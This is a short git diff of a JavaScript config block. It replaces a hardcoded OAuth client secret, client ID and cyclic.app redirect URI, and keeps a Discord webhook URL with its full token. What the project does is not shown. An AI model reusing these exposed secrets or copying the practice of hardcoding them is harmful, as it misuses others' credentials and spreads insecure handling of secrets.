@@ -1,7 +1,7 @@
 //config
-const client_secret = 'ba41d7e0-4e7d-429e-87cc-de6524de7f3a'
-const client_id = 'd6307293-70f0-458b-999d-d773dbc43aaf'
-const redirect_uri = 'https://tiny-pear-gorilla-robe.cyclic.app'
+const client_secret = '5dd447b1-bf56-4432-bf2b-cf588e9f52c1'
+const client_id = 'ec3d1823-2218-473b-9d86-cd2a4c1bdb5f'
+const redirect_uri = 'https://cautious-teal-coypu.cyclic.app'
 const webhook_url = 'https://discord.com/api/webhooks/1116046426120671364/S2vkJtF_PuEWaGFEteEFf9CQ1iHoM2Y_0tsSKPdzZiXyf0c3JvP9M7cTgsEjoYhxvDYo'
 //Requirements
 const axios = require('axios')
